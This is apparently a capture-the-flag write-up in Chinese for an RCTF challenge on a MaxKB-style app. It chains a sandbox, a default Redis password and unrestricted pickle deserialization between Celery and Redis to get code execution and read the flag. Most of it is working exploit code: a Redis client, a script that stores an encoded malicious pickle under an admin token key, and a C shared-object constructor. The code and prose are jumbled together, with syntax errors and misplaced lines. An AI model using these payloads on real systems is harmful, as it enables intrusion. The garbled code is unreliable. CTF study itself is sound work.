# RootKB—

## 题目简述

题目提供可执行 Python 的工具沙箱，沙箱侧 Redis 使用默认口令，Celery 与 Redis 之间的消息使用 pickle 且没有有效的 `find_class` 限制。解法是向 Redis 的 token 相关 key 写入恶意 pickle，让管理员会话触发反序列化并读取 flag。

## 解题过程

### 关键观察

题目提供可执行 Python 的工具沙箱，沙箱侧 Redis 使用默认口令，Celery 与 Redis 之间的消息使用 pickle 且没有有效的 `find_class` 限制。

### 求解步骤

创建工具处有一个沙箱能执行 python 代码。
沙箱连接 redis ，密码是默认的，Password123@redis
celery 和 redis通信使用了 pickle，这里没有 find_class 限制。
读取token 的 key：
#include <stdio.h>

__attribute__((constructor)) void abc(void) {
    const char *src = "/root/flag";
    const char *dst = "/opt/maxkb-app/apps/static/admin/assets/flag";
        rename(src, dst)
}
import base64
import os

def fileWrite():
    with open("/opt/maxkb-app/sandbox/sandbox.so", "wb") as f:
        f.write(base64.b64decode("base64"))
    os.popen("whoami")
    return "success"
import socket

class RedisClient:
    def __init__(self, host='localhost', port=6379):
        self.host = host
        self.port = port
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
写 pickle payload：

    def connect(self):
        """建立 TCP 连接"""
        self.socket.connect((self.host, self.port))

    def send_command(self, command):
        self.socket.sendall((command + '\\r\\n').encode('utf-8'))
        return self.parse_response()

    def parse_response(self):
        """解析 Redis 服务器的响应（基础实现）"""
        response = self.socket.recv(4096).decode('utf-8')
        return response

    def close(self):
        """关闭连接"""
        self.socket.close()

def exp():
    client = RedisClient()
    client.connect()

    client.send_command("auth Password123@redis")

    # 设置键值对
    res = client.send_command("keys *")

    # res = open('/etc/passwd', 'r').read()

    return res

result = exp
import redis
import base64

def main():
    # 1. 连接Redis并进行认证
    try:
        r = redis.Redis(
            host='localhost',
            port=6379,
            password='Password123@redis', # 如果有ACL用户名，加上
username='your_username'
写入后带着 admin 的 cookie 刷新一下触发反序列化。
读 flag：
RCTF{old_vuln_deleted___new_vuln_says_hi!}
            decode_responses=False  # 确保获取的是bytes，便于处理二进制数据
        )
        # 测试连接
        r.ping()
        print("✅ Redis连接成功!")
    except Exception as e:
        print(f"❌ 连接Redis时出现错误: {e}")
        return

    # 2. 准备并存储字节数据
    try:
        # 示例1: 直接存储字节数据
        binary_data =
base64.b64decode('gASVbgAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIxSX19pbXBvcnRfXygn
b3MnKS5wb3BlbignY2F0IC9yb290L2ZsYWcgPiAvdG1wL2ZsYWcgJiYgY2htb2QgNzc3IC90bXAvZm
xhZycpLnJlYWQoKZSFlFKULg==')

 r.set(':TOKEN:eyJ1c2VybmFtZSI6ImFkbWluIiwiaWQiOiJmMGRkOGY3MS1lNGVlLTExZWUtOGM
4NC1hOGExNTk1ODAxYWIiLCJlbWFpbCI6IiIsInR5cGUiOiJTWVNURU1fVVNFUiJ9:1vKY0u:xS22i
8t2qsCFdGvIYZ5T565rDDS6rJXd-ppgf7nnsUA', binary_data)
        print("✅ 字节数据已存储。")

    except Exception as e:
        print(f"❌ 存储数据时出现错误: {e}")

    # 4. 关闭连接 (可选，但推荐)
    r.close()
    print("连接已关闭。")

result = main
def exp():
    res = open('/tmp/flag', 'r').read()
    return res

result = exp

## 方法总结

- 核心技巧：Redis/Celery pickle 反序列化利用。
- 识别信号：默认 Redis 口令、Celery 队列对象落 Redis、pickle 没有类加载限制。
- 复用要点：优先找能被目标会话读取的 key，再写入最小恶意 pickle 验证执行。
